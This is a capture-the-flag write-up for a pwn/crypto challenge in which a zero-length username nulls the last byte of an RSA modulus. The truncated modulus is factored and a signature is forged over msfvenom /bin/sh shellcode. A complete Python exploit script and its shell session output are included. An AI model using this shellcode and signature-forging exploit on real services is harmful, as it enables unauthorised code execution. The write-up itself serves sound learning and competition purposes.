# Naughty or nice - Pwn/crypto (300)

Santa was fed up of getting letters from children, so he made a network service instead. He also hired a cryptographer to keep any naughty children out!

Service: nc 18.205.93.120 1214

Download: [WTnaMqWfC3gc6CDspAv69teSyh0mIA7Y-naughty_or_nice.tar.xz](https://s3.amazonaws.com/advent2018/WTnaMqWfC3gc6CDspAv69teSyh0mIA7Y-naughty_or_nice.tar.xz)
or [WTnaMqWfC3gc6CDspAv69teSyh0mIA7Y-naughty_or_nice.tar.xz](./static/WTnaMqWfC3gc6CDspAv69teSyh0mIA7Y-naughty_or_nice.tar.xz)

## Disassembly

The actual length of this disassembly is not too long. However, that didn't stop me from missing a pretty obvious (in restrospect) byte overwrite. Some pseudocode is as follows:

```
N = 0x61c70c0a941a5523ab2dbdaee498153feaee0cad1c6d9dcfea6de37dc8f32d1f7d48752f2d33e331dec1bc9031bed6c5fdb26ceb37fb619ff3b04dd222b6946824e4c25cac41bd9c910578cb2c04a243452f794fc4fbab8ff47adc8d6a00356eaf9bb74bf83ce5c6288fde471f609cb6c21fd670ced64b63736f7475a2a66fd
modulus := [rbp-0x180..-0x100]
username := [rbp-0x100..-0xe0]
shellcode := [rbp-0xe0..-0xa0]
signature := [rbp-0xa0..-0x20]

memcpy(modulus,N,0x80) // fixed, described later
print("Whats your name?")
fgets(username,0x20,stdin)
username[strlen(username)-1] = (byte)0
fread(shellcode,0xc0,stdin) // reads both shellcode and signature
if (signature^65537 % modulus) == sha1(shellcode):
  print("time to read that latter")
  jmp shellcode
else:
  print("naughty!")
  exit
```

The modulus for this seems to be generated securely (two large primes multiplied together). I tried for a long time to try and factor this using some weak generation method, but couldn't figure it out by the end of the competition.

Re-visiting the pseudocode above, you'll notice that there is a line `username[strlen(username)-1] = (byte)0` which, if the username is length zero, will overwrite the last byte of the modulus making it easily factorable. Once we can get this one byte overwrite, the modulus can be factored fairly easily. I chose to use sage to factor and then compute the lambda value (for creating `d` from `e=65537`).

```sage
In [1]: factor(4291357175424564237110181191679171266805916857692283274837219161498339146378077008530105318423169176941683593964880067899985596539028012628220684275340044520366224987841570561173475037537001293930959174171839178050441977323075585946203588506850388578521692857034945770654099238756338520246394723124309026304)
Out [1]: 2^9 * 3^2 * 197 * 4727330503807728158830131212633040823733957339357157795356144204625743736756729643138952030482375802997307258580178444792532074585611442281158219952212929753999031686056439651602900977264216385904627544869922952413857578657152850423676753413672964011520124851323394505532311097403256442389306087762079

In [2]: from sage.crypto.util import carmichael_lambda
In [3]: carmichael_lambda(4291357175424564237110181191679171266805916857692283274837219161498339146378077008530105318423169176941683593964880067899985596539028012628220684275340044520366224987841570561173475037537001293930959174171839178050441977323075585946203588506850388578521692857034945770654099238756338520246394723124309026304)
Out [3]: 6353532197117586645467696349778806867098438664096020076958657811016999582201044640378751528968313079228380955531759829801163108243061778425876647615774177589374698586059854891754298913443106822655819420305176448044224585715213430969421556587976463631483047800178642215435426114909976658571227381952232832
```

With the lambda value and new (truncated) modulus, its easy enough to create some shellcode, construct the right signature, and submit both to the server. My python code is shown below.

```python
import os
import socket
import binascii
from Crypto.Hash import SHA as SHA1
import sys
import gmpy
import time

def sha1(data):
	if type(data) == list:
		data = bytes(data)
	elif type(data) == str:
		data = data.encode('ascii')
	return SHA1.new(data).hexdigest()

def submit_solution():

	N = bytes([0x06,0x1c,0x70,0xc0,0xa9,0x41,0xa5,0x52,0x3a,0xb2,0xdb,0xda,0xee,0x49,0x81,0x53,0xfe,0xae,0xe0,0xca,0xd1,0xc6,0xd9,0xdc,0xfe,0xa6,0xde,0x37,0xdc,0x8f,0x32,0xd1,0xf7,0xd4,0x87,0x52,0xf2,0xd3,0x3e,0x33,0x1d,0xec,0x1b,0xc9,0x03,0x1b,0xed,0x6c,0x5f,0xdb,0x26,0xce,0xb3,0x7f,0xb6,0x19,0xff,0x3b,0x04,0xdd,0x22,0x2b,0x69,0x46,0x82,0x4e,0x4c,0x25,0xca,0xc4,0x1b,0xd9,0xc9,0x10,0x57,0x8c,0xb2,0xc0,0x4a,0x24,0x34,0x52,0xf7,0x94,0xfc,0x4f,0xba,0xb8,0xff,0x47,0xad,0xc8,0xd6,0xa0,0x03,0x56,0xea,0xf9,0xbb,0x74,0xbf,0x83,0xce,0x5c,0x62,0x88,0xfd,0xe4,0x71,0xf6,0x09,0xcb,0x6c,0x21,0xfd,0x67,0x0c,0xed,0x64,0xb6,0x37,0x36,0xf7,0x47,0x5a,0x2a,0x66,0xfd])
	N = int(binascii.hexlify(N).decode('ascii'),16)
	N0 = N & ~0xff
	lN0 = 6353532197117586645467696349778806867098438664096020076958657811016999582201044640378751528968313079228380955531759829801163108243061778425876647615774177589374698586059854891754298913443106822655819420305176448044224585715213430969421556587976463631483047800178642215435426114909976658571227381952232832
	E = 65537
	D = gmpy.invert(E,lN0)

	s = socket.socket()
	s.settimeout(5)
	s.connect(('18.205.93.120',1214))
	val = b''
	while not val.endswith(b"What's your name? "):
		val = val + s.recv(1024)

	s.send(b'\x00\n')
	val = b''
	while not val.endswith(b"Please write instructions for my elves to follow.\n"):
		val = val + s.recv(1024)
		print(len(val),val)

	pad = 0
	while pad < 256:

		# $ msfvenom -p linux/x64/exec CMD=/bin/sh -f python
		shellcode =  b""
		shellcode += b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
		shellcode += b"\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
		shellcode += b"\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
		shellcode += b"\x00\x56\x57\x48\x89\xe6\x0f\x05"
		shellcode = shellcode + b'\x90' * (0x40-len(shellcode)-1) + bytes([pad])

		h = int(sha1(shellcode),16)
		sig = pow(h,D,N0)
		if pow(sig,E,N0) != h:
			pad += 1
		else:
			break

	sig_bytes = binascii.unhexlify('%0256x'%sig)

	s.send(shellcode+sig_bytes)

	val = b''
	while not val.endswith(b'Time to read that letter...\n=================================\n'):
		val = val + s.recv(1024)
		print(len(val), val)

	time.sleep(1)
	s.send(b'id\n')
	print(s.recv(10240).decode('ascii'))
	s.send(b'ls -al\n')
	print(s.recv(10240).decode('ascii'))
	s.send(b'cat flag\n')
	print(s.recv(10240).decode('ascii'))
	s.send(b'cat redir.sh\n')
	print(s.recv(10240).decode('ascii'))
	s.send(b'ps aux\n')
	print(s.recv(10240).decode('ascii'))

if __name__ == '__main__'

	submit_solution()

```

And the script output is:

```bash
$ ./challenge14.py 
91 b'And what would you like for Christmas, ?\nPlease write instructions for my elves to follow.\n'
24 b'\xe2\x99\xab Making a list... \xe2\x99\xaa'
25 b'\xe2\x99\xab Making a list... \xe2\x99\xaa\n'
54 b'\xe2\x99\xab Making a list... \xe2\x99\xaa\n\xe2\x99\xaa Checking it twice... \xe2\x99\xab\n'
122 b'\xe2\x99\xab Making a list... \xe2\x99\xaa\n\xe2\x99\xaa Checking it twice... \xe2\x99\xab\nNice! Time to read that letter...\n=================================\n'
uid=999(ctf) gid=999(ctf) groups=999(ctf)

total 188
drwxr-xr-x 1 root ctf    4096 Dec 14 05:52 .
drwxr-xr-x 1 root root   4096 Dec 14 05:52 ..
-rwxr-x--- 1 root ctf  175144 Dec 14 05:43 chall
-r--r----- 1 root ctf      32 Dec 14 05:43 flag
-rwxr-x--- 1 root ctf      37 Dec 14 05:43 redir.sh

AOTW{51gn1ng_7h1ngz_c4n_b_h4rd}

#! /bin/bash
cd /home/ctf && ./chall

USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  18376  3004 ?        Ss   Dec25   0:00 /bin/bash /etc/chall_init.sh
root        23  0.0  0.0   4532   824 ?        S    Dec25   0:00 /bin/sleep infinity
root        24  0.0  0.0  32384  2600 ?        Ss   Dec25   0:00 /usr/sbin/xinetd -pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6
ctf         85  0.0  0.0  18376  3156 ?        Ss   06:17   0:00 /bin/bash /home/ctf/redir.sh
ctf         86 96.2  0.0   7248   916 ?        R    06:17 471:28 ./chall
ctf         87  0.0  0.0  18376  3076 ?        Ss   06:17   0:00 /bin/bash /home/ctf/redir.sh
ctf         88 96.2  0.0   7248   872 ?        R    06:17 470:50 ./chall
ctf        207  0.0  0.0  18376  3084 ?        Ss   14:26   0:00 /bin/bash /home/ctf/redir.sh
ctf        208  0.0  0.0   4628   828 ?        S    14:26   0:00 /bin/sh -c /bin/sh
ctf        209  0.0  0.0   4628   820 ?        S    14:26   0:00 /bin/sh
ctf        214  0.0  0.0  34400  2880 ?        R    14:26   0:00 ps aux

```